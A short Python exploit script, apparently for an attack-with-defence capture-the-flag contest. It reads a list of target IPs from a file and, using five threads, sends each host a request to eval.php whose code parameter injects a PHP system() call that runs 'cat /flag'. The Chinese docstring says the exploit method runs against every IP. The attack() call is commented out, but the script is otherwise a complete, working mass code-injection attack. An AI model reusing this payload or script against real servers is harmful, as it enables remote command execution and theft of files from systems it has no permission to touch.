from utils.awd import AwdAttack,AwdTask
from utils.readwrite import readlines
import requests
from os.path import dirname

class Exp(AwdTask):
    """
    自定义一个Exp类，继承自AwdTask。覆写的 exp() 会被运行在每个 ip 上
    """

    def exp(self, ip, port):
        url = f"http://{ip}:{port}/eval.php"
        resp = requests.get(url,params={"code":"system('cat /flag');"})
        print(resp.text)


hosts = readlines(f"{dirname(__file__)}/../../ip.txt")
attacker = AwdAttack(hosts=hosts,task_class=Exp,port=80,thread_num=5)
# attacker.attack()